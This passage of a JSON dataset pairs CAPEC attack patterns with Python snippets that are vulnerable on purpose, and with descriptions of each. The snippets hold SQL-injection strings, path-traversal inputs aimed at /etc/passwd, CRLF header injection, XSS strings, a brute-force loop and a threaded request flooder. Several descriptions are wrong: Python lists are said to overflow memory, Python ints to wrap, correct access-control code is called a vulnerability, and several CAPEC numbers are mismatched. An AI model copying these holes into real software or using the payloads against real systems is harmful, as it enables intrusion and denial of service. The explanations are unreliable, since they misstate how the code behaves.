        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Clickjacking Vulnerable Page</title>\n    </head>\n    <body>\n        <h1>Welcome to the vulnerable page</h1>\n        <button onclick=\"alert('Button clicked!')\">Click me</button>\n    </body>\n    </html>\n    ''')\n\n@app.route('/frame')\ndef frame():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Frame Page</title>\n    </head>\n    <body>\n        <iframe src=\"/\" width=\"500\" height=\"500\"></iframe>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that is vulnerable to clickjacking. The main page ('/') contains a button that triggers an alert when clicked. The '/frame' route serves a page that embeds the main page within an iframe. This setup demonstrates the CAPEC concept of clickjacking, where an adversary can trick a user into interacting with a UI element (the button) within an embedded frame, making it appear as though the user is interacting with a different interface. The code does not implement any frame-busting techniques, making it susceptible to clickjacking attacks. The related CWEs are represented by the improper restriction of rendered UI layers or frames (CWE-1021) and the potential for misinterpretation of input (CWE-115) when the user interacts with the embedded frame."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import webbrowser\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-285: Improper Authorization\n# CWE-116: Improper Encoding or Escaping of Output\n# CWE-20: Improper Input Validation\n\n# Simulate user input for URL\nuser_input = \"http://example.com\"\n\n# CWE-20: No input validation\n# CWE-116: No encoding or escaping\nmalicious_url = user_input + \"<script>alert('XSS');</script>\"\n\n# CWE-250: Executing with unnecessary privileges\n# CWE-285: No proper authorization check\nwebbrowser.open(malicious_url)\n",
        "description": "This Python code snippet demonstrates a Cross Zone Scripting vulnerability. The code takes user input for a URL without proper validation (CWE-20) and appends a malicious script to it. It also fails to encode or escape the output (CWE-116), allowing the script to be executed. The webbrowser.open function is used to open the URL in the default web browser, which can lead to execution with unnecessary privileges (CWE-250) and improper authorization (CWE-285). This represents a scenario where an attacker can exploit the lack of security checks to execute malicious scripts in a higher-privileged security zone."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport urllib.parse\n\nclass VulnerableHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Extract query parameters\n        query = urllib.parse.urlparse(self.path).query\n        params = urllib.parse.parse_qs(query)\n\n        # Improper neutralization of CRLF sequences\n        user_input = params.get('input', [''])[0]\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.send_header('X-User-Input', user_input)  # Vulnerable to HTTP Response Splitting\n        self.end_headers()\n        self.wfile.write(b'Hello, World!')\n\nif __name__ == '__main__':\n    server = HTTPServer(('localhost', 8080), VulnerableHTTPRequestHandler)\n    print('Starting server at http://localhost:8080')\n    server.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Request Splitting attacks. The server extracts query parameters from the URL without properly neutralizing CRLF sequences. An attacker can exploit this by injecting CRLF characters into the 'input' parameter, causing the server to split the HTTP response headers and potentially inject malicious headers or content. This vulnerability is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Configure logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n@app.route('/log', methods=['GET', 'POST'])\ndef log():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Log user input\n        logging.info(f'User input: {user_input}')\n        # Render user input in a web page without proper neutralization\n        return render_template_string(f'<p>{user_input}</p>')\n    return '''\n        <form method=\"post\">\n            User Input: <input type=\"text\" name=\"user_input\">\n            <input type=\"submit\">\n        </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that logs user input and renders it on a web page without proper neutralization, embodying the main idea of the deprecated CAPEC 'XSS through Log Files'. The code uses logging to store user input in a log file and then displays the input on a web page without sanitizing it, making it vulnerable to Cross-Site Scripting (XSS) attacks. This example highlights the CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-692 (Incomplete Denylist to Cross-Site Scripting) weaknesses, as the user input is neither sanitized nor properly handled, allowing potential XSS attacks."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/trace', methods=['TRACE'])\ndef trace_method():\n    # CWE-693: No protection mechanism against TRACE method\n    # CWE-648: Incorrect use of privileged API (TRACE method)\n    # CWE-79: No input neutralization\n    # CWE-352: No CSRF protection\n    # CWE-692: Incomplete denylist for XSS\n    response = make_response(request.data)\n    response.headers['Content-Type'] = 'message/http'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes a route for handling HTTP TRACE requests. The TRACE method is inherently vulnerable to Cross Site Tracing (XST) attacks, as it can echo back the received request, including sensitive headers like cookies. The code does not implement any protection mechanisms (CWE-693), uses the TRACE method incorrectly (CWE-648), does not neutralize input (CWE-79), lacks CSRF protection (CWE-352), and does not use a complete denylist for XSS (CWE-692). This makes it a prime example of how XST vulnerabilities can be introduced in a web application."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import sqlite3\nimport os\n\ndef execute_command_from_db(user_input):\n    # Vulnerable to SQL Injection\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = f\"SELECT command FROM commands WHERE user='{user_input}'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    if result:\n        command = result[0]\n        # Vulnerable to OS Command Injection\n        os.system(command)\n    conn.close()\n\n# Example usage\nuser_input = \"' OR '1'='1\"  # This input can be used to inject SQL\nexecute_command_from_db(user_input)",
        "description": "This Python code snippet demonstrates a scenario where an attacker can exploit SQL Injection to execute OS commands. The function `execute_command_from_db` takes user input, constructs an SQL query without proper sanitization, and executes it. If the query returns a result, it directly uses the result as an argument to `os.system`, which can lead to OS Command Injection. This code embodies the main idea of the CAPEC by showing how improper neutralization of special elements in SQL commands and OS commands can lead to severe security vulnerabilities."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\n# Database connection setup\nengine = create_engine('sqlite:///example.db')\nSession = sessionmaker(bind=engine)\nsession = Session()\n\n# User input\nuser_input = \"1 OR 1=1\"\n\n# Vulnerable ORM query\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\nresult = session.execute(query)\n\nfor row in result:\n    print(row)",
        "description": "This Python code snippet demonstrates a vulnerable Object Relational Mapping (ORM) injection scenario using SQLAlchemy, a popular ORM tool. The code sets up a database connection and a session, then constructs a raw SQL query using user input without proper validation or sanitization. The user input is directly interpolated into the SQL query, making it susceptible to SQL injection attacks. In this example, an attacker could manipulate the 'user_input' variable to alter the SQL query's logic, potentially gaining unauthorized access to the database. This snippet embodies the main idea of CAPEC-20, highlighting the risks associated with improper input validation (CWE-20), SQL injection (CWE-89), and improper neutralization of special elements in data query logic (CWE-943)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import xml.etree.ElementTree as ET\nimport sqlite3\n\n# Sample SOAP message\nsoap_message = '''\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\">\n  <soap:Body>\n    <GetUserDetails>\n      <UserId>1 OR 1=1</UserId>\n    </GetUserDetails>\n  </soap:Body>\n</soap:Envelope>\n'''\n\n# Parse the SOAP message\nroot = ET.fromstring(soap_message)\nuser_id = root.find('.//UserId').text\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Vulnerable SQL query\nquery = f\"SELECT * FROM users WHERE id = {user_id}\"\n\ntry:\n    cursor.execute(query)\n    results = cursor.fetchall()\n    for row in results:\n        print(row)\nexcept sqlite3.Error as e:\n    print(f\"An error occurred: {e}\")\n\nconn.close()",
        "description": "This Python code snippet demonstrates a SQL Injection vulnerability through SOAP parameter tampering. The SOAP message contains a UserId parameter that is extracted and directly used in an SQL query without proper validation or parameter binding. This allows an attacker to manipulate the SQL query by injecting malicious input, such as '1 OR 1=1', which can lead to unauthorized data access. The code also highlights the potential for generating error messages that may contain sensitive information, further exacerbating the security risk."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
        "code_snippet": "from flask import Flask, request, jsonify\nimport json\n\napp = Flask(__name__)\n\n@app.route('/data', methods=['GET'])\ndef get_data():\n    # Simulated sensitive data\n    data = {'user': 'admin', 'password': 'secret'}\n    callback = request.args.get('callback')\n    if callback:\n        # Vulnerable to JSON Hijacking\n        response = f'{callback}({json.dumps(data)})'\n        return app.response_class(response, mimetype='application/javascript')\n    return jsonify(data)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to JSON Hijacking. The '/data' endpoint returns sensitive data in JSON format. If a 'callback' parameter is provided in the request, the server wraps the JSON data in a JavaScript function call, making it vulnerable to JSON Hijacking. This vulnerability arises because the server does not sufficiently verify the origin or authenticity of the request (CWE-345, CWE-346), and it allows cross-site script inclusion (CWE-79). The code also implicitly relies on the client to enforce security (CWE-602), making it susceptible to attacks where an attacker can steal sensitive information by including the endpoint in a malicious script."
    },
    {
        "capec_id": "112",
        "capec_name": "Brute Force",
        "code_snippet": "import random\nimport string\n\n# Weak password requirements (CWE-521)\ndef generate_weak_password():\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(6))\n\n# Insufficiently random values (CWE-330)\ndef generate_insufficiently_random_token():\n    return random.randint(0, 1000)\n\n# Inadequate encryption strength (CWE-326)\ndef weak_encrypt(data):\n    return ''.join(chr(ord(char) + 1) for char in data)\n\n# Weak authentication (CWE-1390)\nusers = {'user1': 'password123'}\ndef weak_authenticate(username, password):\n    return users.get(username) == password\n\n# Improper restriction of excessive authentication attempts (CWE-307)\ndef brute_force_attack(username):\n    for i in range(10000):\n        if weak_authenticate(username, generate_weak_password()):\n            print(f'Brute force successful: {username} logged in')\n            return\n    print('Brute force failed')\n\n# Simulate a brute force attack\nbrute_force_attack('user1')",
        "description": "This Python code snippet demonstrates a brute force attack by exploiting several common weaknesses. The `generate_weak_password` function creates weak passwords with only lowercase letters and a length of 6 characters (CWE-521). The `generate_insufficiently_random_token` function generates a token with insufficient randomness (CWE-330). The `weak_encrypt` function uses a simple and inadequate encryption method (CWE-326). The `weak_authenticate` function checks user credentials against a dictionary with weak authentication (CWE-1390). Finally, the `brute_force_attack` function attempts to brute force the password for a given username by trying 10,000 weak passwords without any restriction on the number of attempts (CWE-307). This code illustrates how these weaknesses can be exploited in a brute force attack scenario."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate memory-mapped I/O register access\nclass MemoryMappedIO:\n    def __init__(self, address):\n        self.address = address\n        self.value = 0\n\n    def read(self):\n        return self.value\n\n    def write(self, value):\n        self.value = value\n\n# Simulate improper access control to memory-mapped I/O registers\nclass Device:\n    def __init__(self):\n        self.registers = {\n            'CONTROL': MemoryMappedIO(0x1000),\n            'STATUS': MemoryMappedIO(0x1004)\n        }\n\n    def read_register(self, name):\n        if name in self.registers:\n            return self.registers[name].read()\n        else:\n            raise ValueError('Register not found')\n\n    def write_register(self, name, value):\n        if name in self.registers:\n            self.registers[name].write(value)\n        else:\n            raise ValueError('Register not found')\n\n# Simulate an attacker manipulating the interface\ndevice = Device()\n\n# Attacker writes to CONTROL register without proper access control\ndevice.write_register('CONTROL', 0xDEADBEEF)\n\n# Attacker reads from STATUS register\nstatus = device.read_register('STATUS')\nprint(f'STATUS register value: {status}')",
        "description": "This Python code snippet simulates a scenario where an attacker manipulates a memory-mapped I/O register interface, embodying the main idea of CAPEC-225 (Interface Manipulation). The `MemoryMappedIO` class represents a memory-mapped I/O register, and the `Device` class simulates a device with such registers. The `Device` class lacks proper access control mechanisms for its registers, allowing an attacker to write to the 'CONTROL' register and read from the 'STATUS' register without any restrictions. This demonstrates vulnerabilities related to CWE-1262 (Improper Access Control for Register Interface) and CWE-782 (Exposed IOCTL with Insufficient Access Control). The code highlights how improper access control can lead to unauthorized manipulation of hardware interfaces, potentially compromising the system's security."
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "import hashlib\n\n# Weak authentication mechanism\nusers = {\n    'admin': hashlib.md5('password123'.encode()).hexdigest(),  # Weak password storage\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users and users[username] == hashlib.md5(password.encode()).hexdigest():\n        return True\n    return False\n\n# Simulate an authentication bypass\n# An attacker can exploit the weak password storage and lack of brute force protection\nattempts = 0\nwhile attempts < 1000:  # No restriction on excessive attempts\n    if authenticate('admin', 'password123'):  # Known weak password\n        print('Access granted')\n        break\n    attempts += 1\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that embodies the main idea of CAPEC-Authentication Abuse. The code uses a weak password storage method (MD5 hashing) and lacks protection against excessive authentication attempts, making it susceptible to brute force attacks. The 'authenticate' function checks if the provided username and password match the stored credentials. An attacker can exploit these weaknesses by repeatedly attempting to authenticate with a known weak password, eventually gaining unauthorized access. This example highlights CWE-287 (Improper Authentication), CWE-307 (Improper Restriction of Excessive Authentication Attempts), and CWE-1390 (Weak Authentication)."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'admin': hashlib.sha256('password123'.encode()).hexdigest()\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        if users[username] == hashlib.sha256(password.encode()).hexdigest():\n            return True\n    return False\n\n# Vulnerable function that bypasses authentication\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\n# CWE-305: Authentication Bypass by Primary Weakness\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n\ndef access_protected_resource(username, password):\n    if username == 'admin' and password == 'admin':  # CWE-1390: Weak Authentication\n        return 'Access granted to protected resource'\n    if authenticate(username, password):\n        return 'Access granted to protected resource'\n    return 'Access denied'\n\n# Example usage\nprint(access_protected_resource('admin', 'admin'))  # Bypasses authentication\nprint(access_protected_resource('admin', 'password123'))  # Proper authentication",
        "description": "This Python code snippet demonstrates an authentication bypass vulnerability. The `authenticate` function checks if the provided username and password match the stored hashed password. However, the `access_protected_resource` function contains a hardcoded check (`username == 'admin' and password == 'admin'`) that allows access without proper authentication, representing CWE-288 and CWE-305. Additionally, the use of a weak password ('admin') for the admin user demonstrates CWE-1390. The assumption that the username 'admin' and password 'admin' are immutable and always valid represents CWE-302. This code snippet embodies the main idea of CAPEC-115: Authentication Bypass, by allowing an attacker to gain access to protected resources without proper authentication."
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "import os\n\n# CWE-426: Untrusted Search Path\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-1243: Sensitive Non-Volatile Information Not Protected During Debug\n\n# Simulate sensitive information\nsensitive_info = 'SECRET_KEY=12345'\n\n# Function to simulate an untrusted search path\n# This function will expose sensitive information if an attacker places a malicious file in the search path\n\ndef load_config():\n    config_path = os.getenv('CONFIG_PATH', './config')\n    try:\n        with open(os.path.join(config_path, 'config.txt'), 'r') as file:\n            config = file.read()\n            print('Config loaded:', config)\n    except FileNotFoundError:\n        print('Config file not found')\n\n# Simulate an attacker placing a malicious config file in the search path\nos.makedirs('./malicious', exist_ok=True)\nwith open('./malicious/config.txt', 'w') as file:\n    file.write(sensitive_info)\n\n# Set the environment variable to the malicious path\nos.environ['CONFIG_PATH'] = './malicious'\n\n# Load the config, which will now read from the malicious path\nload_config()",
        "description": "This Python code snippet demonstrates the concept of 'Excavation' by simulating an untrusted search path vulnerability (CWE-426) that leads to the exposure of sensitive information (CWE-200). The code defines a function `load_config` that reads a configuration file from a path specified by an environment variable `CONFIG_PATH`. An attacker can exploit this by placing a malicious file in a directory and setting the `CONFIG_PATH` to this directory, causing the program to load and potentially expose sensitive information. This example also touches on the idea of sensitive information not being protected during debug (CWE-1243) by showing how easily accessible the sensitive information is in the simulated environment."
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "import socket\n\n# Vulnerable code: Transmitting sensitive information in cleartext\nserver_address = ('localhost', 10000)\n\n# Create a TCP/IP socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Connect the socket to the port where the server is listening\nsock.connect(server_address)\n\ntry:\n    # Send sensitive data in cleartext\n    message = 'username=admin&password=secret'\n    sock.sendall(message.encode('utf-8'))\n\n    # Look for the response\n    amount_received = 0\n    amount_expected = len(message)\n\n    while amount_received < amount_expected:\n        data = sock.recv(16)\n        amount_received += len(data)\n        print('Received:', data.decode('utf-8'))\n\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation where sensitive information (username and password) is transmitted in cleartext over a network. The code creates a TCP/IP socket, connects to a server, and sends a message containing sensitive data without any encryption. This makes it susceptible to interception attacks (CAPEC-158) where an adversary can monitor the data stream and capture the sensitive information. The code also lacks proper message integrity checks (CWE-924), making it possible for the data to be modified during transmission without detection. This example highlights the importance of encrypting sensitive data and ensuring message integrity to prevent interception and unauthorized access."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "import urllib.parse\n\ndef is_safe_input(user_input):\n    # Incomplete list of disallowed inputs (CWE-184)\n    disallowed_inputs = ['<script>', '..', '%2E']\n    for disallowed in disallowed_inputs:\n        if disallowed in user_input:\n            return False\n    return True\n\n# Example of improper handling of URL encoding (CWE-177)\ndef process_input(user_input):\n    # Validate before filtering (CWE-181)\n    if not is_safe_input(user_input):\n        raise ValueError('Unsafe input detected!')\n    # Decode the input (potential double encoding issue)\n    decoded_input = urllib.parse.unquote(user_input)\n    # Process the decoded input\n    print(f'Processing: {decoded_input}')\n\n# Example input with double encoding\nuser_input = '%252E%252E%252Fetc%252Fpasswd'\nprocess_input(user_input)",
        "description": "This Python code snippet demonstrates the concept of double encoding and related weaknesses. The `is_safe_input` function checks for disallowed inputs using an incomplete list (CWE-184). The `process_input` function validates the input before filtering (CWE-181) and decodes the input, which can lead to improper handling of URL encoding (CWE-177). The example input '%252E%252E%252Fetc%252Fpasswd' represents a double-encoded path traversal attempt. The code highlights how double encoding can bypass simple filters and lead to security vulnerabilities."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "import os\n\nclass ProductionSystem:\n    def __init__(self):\n        self.debug_mode = os.getenv('DEBUG_MODE', 'False') == 'True'\n        self.security_token = self.generate_security_token()\n\n    def generate_security_token(self):\n        if self.debug_mode:\n            # Insecure token generation for debugging purposes\n            return 'DEBUG-TOKEN-1234'\n        else:\n            # Proper token generation for production\n            return 'PROD-TOKEN-5678'\n\n    def debug_info(self):\n        if self.debug_mode:\n            # Exposing sensitive information in debug mode\n            return 'Sensitive debug information'\n        else:\n            return 'No debug information available'\n\n# Simulate a production environment with debug mode enabled\nos.environ['DEBUG_MODE'] = 'True'\n\nsystem = ProductionSystem()\nprint(system.debug_info())\nprint(system.security_token)",
        "description": "This Python code snippet represents a production system that has a debug mode which can be enabled via an environment variable. When the debug mode is enabled, the system generates an insecure security token and exposes sensitive debug information. This embodies the main idea of CAPEC-Non-Production Interfaces, where an adversary can exploit debug interfaces unintentionally left enabled in a production environment. The related CWEs are represented by the insecure token generation (CWE-1270), revealing unnecessary debug information (CWE-1295), and active debug code (CWE-489)."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "class User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nclass Resource:\n    def __init__(self, name, sensitive_data):\n        self.name = name\n        self.sensitive_data = sensitive_data\n\n    def access_resource(self, user):\n        if user.role == 'admin':\n            return self.sensitive_data\n        else:\n            return 'Access Denied'\n\n# Example usage\nadmin_user = User('admin_user', 'admin')\nregular_user = User('regular_user', 'user')\n\nresource = Resource('confidential', 'Top Secret Data')\n\n# Admin access\nprint(resource.access_resource(admin_user))  # Should print 'Top Secret Data'\n\n# Regular user access\nprint(resource.access_resource(regular_user))  # Should print 'Access Denied'\n",
        "description": "This Python code snippet demonstrates a basic implementation of access control based on user roles, addressing the CAPEC concept of 'Privilege Abuse'. The `User` class defines users with different roles, and the `Resource` class contains sensitive data that should only be accessible by users with the 'admin' role. The `access_resource` method checks the user's role before granting access to the sensitive data. This example highlights the importance of proper privilege management (CWE-269), correct permission assignment (CWE-732), and proper access control (CWE-284) to prevent unauthorized access to critical resources."
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # Potential buffer overflow\n    return buffer\n\n# Example usage\ninput_data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]  # Input larger than buffer\nresult = vulnerable_function(input_data)\nprint(result)",
        "description": "This Python code snippet demonstrates a buffer manipulation vulnerability, specifically a buffer overflow (CWE-119). The function `vulnerable_function` takes `input_data` and attempts to copy its contents into a fixed-size buffer of 10 elements. If `input_data` is larger than the buffer, it will overwrite memory beyond the buffer's bounds, leading to undefined behavior or potential security issues. This example embodies the main idea of the CAPEC by showing how improper handling of buffer boundaries can lead to vulnerabilities. The input data in the example usage is intentionally larger than the buffer to trigger the overflow condition."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Lock for synchronizing access to the shared resource\nlock = threading.Lock()\n\n# Function to be run by each thread\ndef manipulate_shared_resource():\n    global shared_resource\n    for _ in range(1000):\n        # Improper synchronization: lock is not used\n        temp = shared_resource\n        temp += 1\n        shared_resource = temp\n\n# Create multiple threads\nthreads = [threading.Thread(target=manipulate_shared_resource) for _ in range(10)]\n\n# Start all threads\nfor thread in threads:\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()\n\nprint(f\"Final value of shared_resource: {shared_resource}\")",
        "description": "This Python code snippet demonstrates a shared resource manipulation vulnerability. The shared resource 'shared_resource' is accessed and modified by multiple threads without proper synchronization, leading to a race condition. The lock 'lock' is defined but not used, which is an example of CWE-662 (Improper Synchronization). This can result in inconsistent or corrupted data, as multiple threads may simultaneously read and write to the shared resource. The code represents the main idea of CAPEC-1189, where an adversary could exploit such a vulnerability to manipulate the shared resource, causing unexpected behavior in the application."
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "import threading\nimport requests\n\n# URL to be targeted\nurl = 'http://example.com'\n\n# Function to perform a single request\ndef flood_request():\n    try:\n        response = requests.get(url)\n        print(f'Response Code: {response.status_code}')\n    except requests.exceptions.RequestException as e:\n        print(f'Request failed: {e}')\n\n# Number of threads to simulate high volume of requests\nnum_threads = 1000\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=flood_request)\n    threads.append(thread)\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a basic flooding attack by rapidly sending a large number of HTTP GET requests to a target URL using multithreading. The code creates 1000 threads, each making a request to the specified URL. This simulates a high volume of interactions with the target, potentially leading to resource exhaustion and denial of service. The code embodies the main idea of the CAPEC 'Flooding' attack by exploiting the lack of rate limiting and resource throttling (CWE-770) and can lead to uncontrolled resource consumption (CWE-400)."
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/data/'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a path traversal vulnerability. The `read_file` function takes a `file_path` parameter, which is intended to be a relative path within a restricted directory (`/var/www/data/`). However, the code does not properly sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse out of the restricted directory and access sensitive files on the system, such as `/etc/passwd`. The example usage shows how an attacker could exploit this vulnerability by providing a malicious input to read the contents of `/etc/passwd`. This code embodies the main idea of the CAPEC by illustrating how insufficient input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\n\n@app.route('/files/<path:filename>', methods=['GET'])\ndef download_file(filename):\n    # Vulnerable to directory indexing and forced browsing\n    directory = os.path.join(os.getcwd(), 'files')\n    return send_from_directory(directory, filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that serves files from a directory. The `download_file` function is vulnerable to directory indexing and forced browsing attacks. An attacker can craft a request to access any file within the 'files' directory, potentially exposing sensitive information. The code does not perform proper authorization checks (CWE-285) or protect alternate paths (CWE-424), allowing unauthorized access to files. Additionally, the use of `send_from_directory` without proper validation can lead to directory traversal attacks, exposing critical resources (CWE-732). This snippet demonstrates how improper handling of file paths and lack of authorization checks can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "def vulnerable_function(user_input):\n    MAX_INT = 2147483647  # Maximum value for a 32-bit signed integer\n    MIN_INT = -2147483648  # Minimum value for a 32-bit signed integer\n    try:\n        # Convert user input to integer\n        value = int(user_input)\n        # CWE-839: Numeric Range Comparison Without Minimum Check\n        if value <= MAX_INT:\n            # CWE-190: Integer Overflow or Wraparound\n            result = value + 1\n            print(f\"Result: {result}\")\n        else:\n            print(\"Input is too large.\")\n    except ValueError:\n        print(\"Invalid input.\")\n\n# Example usage\nvulnerable_function(\"2147483647\")",
        "description": "This Python code snippet demonstrates a vulnerable function that takes user input, converts it to an integer, and performs a calculation. The function checks if the input is less than or equal to the maximum value for a 32-bit signed integer (CWE-839) but does not check if it is greater than or equal to the minimum value. This can lead to an integer overflow or wraparound (CWE-190) when adding 1 to the maximum integer value, resulting in an unexpected negative number. The code embodies the main idea of the CAPEC by showing how an attacker can exploit the structure of integer variables to cause unexpected behavior."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "import ctypes\n\n# Simulate untrusted input\nuntrusted_input = -1\n\n# Convert untrusted input to a pointer\nptr = ctypes.c_void_p(untrusted_input)\n\n# Dereference the pointer\ntry:\n    value = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int)).contents.value\n    print(f'Dereferenced value: {value}')\nexcept ValueError as e:\n    print(f'Error: {e}')\nexcept Exception as e:\n    print(f'Unexpected error: {e}')",
        "description": "This Python code snippet demonstrates a pointer manipulation vulnerability by converting an untrusted input to a pointer and then attempting to dereference it. The untrusted input is set to -1, which is an invalid memory address. The code uses the `ctypes` library to handle the pointer operations. When the pointer is dereferenced, it will likely cause an error or crash, illustrating CWE-822 (Untrusted Pointer Dereference) and CWE-476 (NULL Pointer Dereference). This example embodies the main idea of the CAPEC by showing how manipulating a pointer with an untrusted value can lead to unintended memory access and potential application crashes."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "import os\n\ndef excessive_allocation(input_size):\n    try:\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        data = 'A' * input_size\n        # CWE-1325: Improperly Controlled Sequential Memory Allocation\n        large_list = [data] * input_size\n        # Simulate some processing\n        result = sum(len(item) for item in large_list)\n        return result\n    except MemoryError:\n        # CWE-404: Improper Resource Shutdown or Release\n        print('Memory allocation failed. Releasing resources.')\n        del large_list\n        return None\n\n# CWE-400: Uncontrolled Resource Consumption\n# This input size is excessively large and can cause memory exhaustion\nexcessive_allocation(10**8)",
        "description": "This Python code snippet demonstrates an 'Excessive Allocation' attack by allocating a large amount of memory based on the input size. The function `excessive_allocation` takes an `input_size` parameter and attempts to create a large string and a list containing many copies of that string. This can lead to memory exhaustion, especially with very large input sizes. The code also includes a basic exception handling mechanism to catch `MemoryError` and release resources, though it is rudimentary and may not fully mitigate the issue. The snippet embodies the main idea of the CAPEC by showing how a single, carefully crafted request can cause excessive resource allocation, potentially leading to denial of service."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import threading\n\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.resource = None\n\n    def acquire_resource(self):\n        self.lock.acquire()\n        self.resource = 'Acquired Resource'\n        print('Resource acquired')\n\n    def release_resource(self):\n        if self.resource:\n            print('Resource released')\n            self.resource = None\n        self.lock.release()\n\n    def use_resource(self):\n        if self.resource:\n            print('Using resource')\n        else:\n            print('Resource not available')\n\nresource_manager = Resource()\n\n# Simulate resource acquisition and usage\nresource_manager.acquire_resource()\nresource_manager.use_resource()\n\n# Simulate missing release of resource\n# resource_manager.release_resource()  # This line is commented out to simulate the resource leak\n\n# Attempt to acquire the resource again\nresource_manager.acquire_resource()\nresource_manager.use_resource()\n\n# Properly release the resource\nresource_manager.release_resource()",
